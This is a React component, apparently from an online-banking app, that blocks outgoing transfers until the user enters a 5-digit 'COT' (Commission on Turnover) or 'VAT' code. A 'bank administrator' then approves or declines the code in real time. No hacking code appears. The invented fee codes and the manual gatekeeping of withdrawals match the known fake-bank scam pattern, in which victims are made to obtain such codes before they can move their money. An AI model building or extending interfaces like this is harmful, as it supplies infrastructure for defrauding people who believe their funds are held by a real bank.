"use client";

import * as React from "react";
import { KeyRound, AlertCircle, ArrowLeft, RefreshCw } from "lucide-react";
import { cn } from "@/lib/utils";
import { OTPInputWrapper } from "@/components/ui/input";
import { createBrowserClient, useAuth } from "@/lib/supabase";
import { TransferService } from "@/lib/services/transfer/TransferService";
import { useToast } from "@/components/app-shell";

interface TransferCodeFormProps {
  type: "COT" | "VAT";
  onBack: () => void;
  onVerified: (transferId: string) => void;
  transferData: any;
}

export const TransferCodeForm: React.FC<TransferCodeFormProps> = ({
  type,
  onBack,
  onVerified,
  transferData,
}) => {
  const { user } = useAuth();
  const supabase = createBrowserClient();

  const [code, setCode] = React.useState("");
  const [isSubmitting, setIsSubmitting] = React.useState(false);
  const [isWaiting, setIsWaiting] = React.useState(false);
  const [createdTransferId, setCreatedTransferId] = React.useState<string | null>(null);
  const [errorMsg, setErrorMsg] = React.useState<string | null>(null);

  // Clean up realtime subscription on unmount
  React.useEffect(() => {
    if (!createdTransferId) return;

    const channel = supabase
      .channel(`realtime-transfer-code-${createdTransferId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "transfer_requests",
          filter: `id=eq.${createdTransferId}`,
        },
        (payload: any) => {
          const updated = payload.new;
          const status = type === "COT" ? updated.cot_status : updated.vat_status;
          
          if (status === "APPROVED") {
            onVerified(createdTransferId);
          } else if (status === "DECLINED") {
            setIsWaiting(false);
            setErrorMsg(`The entered ${type} code was declined by the bank administrator.`);
            setCreatedTransferId(null);
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [createdTransferId, type, onVerified, supabase]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isSubmitting || isWaiting || !user || !transferData.sourceAccount) return;

    if (code.length !== 5) {
      setErrorMsg(`Please enter the complete 5-digit ${type} code.`);
      return;
    }

    setIsSubmitting(true);
    setErrorMsg(null);

    const ref = "NSTR-" + Math.floor(10000000 + Math.random() * 90000000);
    const numAmount = parseFloat(transferData.amount) || 0;

    try {
      const res = await TransferService.submitTransfer(supabase, {
        userId: user.id,
        sourceAccountId: transferData.sourceAccount.id,
        recipientName: transferData.recipientName,
        recipientBank: transferData.recipientBank,
        destinationCountry: transferData.destinationCountry,
        recipientAccount: transferData.recipientAccount,
        routingInformation: transferData.routingValue,
        amount: numAmount,
        currency: transferData.currency,
        transferType: transferData.transactionType,
        transferSpeed: transferData.speed,
        description: transferData.description,
        reference: ref,
        cotCode: type === "COT" ? code : undefined,
        vatCode: type === "VAT" ? code : undefined,
        cotStatus: type === "COT" ? "PENDING" : "NONE",
        vatStatus: type === "VAT" ? "PENDING" : "NONE",
      });

      if (res.success && res.data) {
        setCreatedTransferId(res.data.id);
        setIsWaiting(true);
      } else {
        setErrorMsg(res.error || `Failed to submit ${type} code.`);
      }
    } catch (err: any) {
      setErrorMsg(err.message || "An unexpected error occurred.");
    } finally {
      setIsSubmitting(false);
    }
  };

  if (isWaiting) {
    return (
      <div className="w-full max-w-md mx-auto bg-surface border border-border p-6 rounded-custom-xl shadow-soft select-none text-center space-y-6 animate-pulse">
        <div className="p-3 bg-amber-500/5 border border-amber-500/10 text-amber-500 rounded-full w-fit mx-auto">
          <RefreshCw className="h-6 w-6 animate-spin" />
        </div>
        <div className="space-y-1.5">
          <h3 className="text-sm font-black uppercase tracking-widest text-foreground">
            Verifying Transaction Code
          </h3>
          <p className="text-[10px] font-semibold text-text-secondary leading-normal max-w-xs mx-auto">
            Your entered {type} code is currently undergoing manual compliance audit. Please keep this window open while the administrator accepts the credentials.
          </p>
        </div>
        <div className="p-4 bg-muted/10 border border-border/40 rounded-xl max-w-xs mx-auto">
          <p className="text-[9px] uppercase tracking-wider text-muted-foreground font-bold">Entered {type} Code</p>
          <p className="text-lg font-mono font-black text-foreground tracking-widest mt-1">{code}</p>
        </div>
        <p className="text-[9px] text-muted-foreground font-semibold">
          Realtime sync active. Do not refresh.
        </p>
      </div>
    );
  }

  return (
    <div className="w-full max-w-md mx-auto bg-surface border border-border p-6 rounded-custom-xl shadow-soft select-none space-y-6">
      {/* Back CTA */}
      <button
        onClick={onBack}
        disabled={isSubmitting}
        className="flex items-center gap-1.5 text-xs font-bold text-muted-foreground hover:text-foreground transition-colors disabled:opacity-50 cursor-pointer outline-none"
      >
        <ArrowLeft className="h-3.5 w-3.5" />
        <span>Back to Review</span>
      </button>

      {/* Header */}
      <div className="space-y-1.5 text-center">
        <div className="p-3 bg-primary/5 border border-primary/10 text-primary rounded-full w-fit mx-auto">
          <KeyRound className="h-5 w-5" />
        </div>
        <h3 className="text-sm font-black uppercase tracking-widest text-foreground">
          {type} Code Verification
        </h3>
        <p className="text-[10px] font-semibold text-text-secondary leading-normal max-w-xs mx-auto">
          A {type === "COT" ? "Commission on Turnover" : "Value Added Tax"} validation code is required for this account to authorize outgoing transactions.
        </p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-5">
        <div className="flex flex-col items-center gap-4">
          <OTPInputWrapper
            label={`5-Digit ${type} Code`}
            length={5}
            value={code}
            onChange={(val) => { setCode(val); setErrorMsg(null); }}
            helperText="Provide validation code"
            mask={false}
          />
        </div>

        {/* Inline Error */}
        {errorMsg && (
          <p className="text-[10px] text-error font-bold flex items-center justify-center gap-1.5 bg-error/5 border border-error/10 p-2.5 rounded-custom-lg">
            <AlertCircle className="h-3.5 w-3.5 shrink-0" />
            <span>{errorMsg}</span>
          </p>
        )}

        <button
          type="submit"
          disabled={isSubmitting || code.length < 5}
          className="w-full py-2.5 bg-primary text-primary-foreground hover:opacity-90 disabled:opacity-50 font-bold text-xs rounded-custom-md transition-all shadow-soft flex items-center justify-center gap-1.5 cursor-pointer outline-none"
        >
          {isSubmitting ? "Submitting Code..." : `Submit ${type} Code`}
        </button>
      </form>
    </div>
  );
};
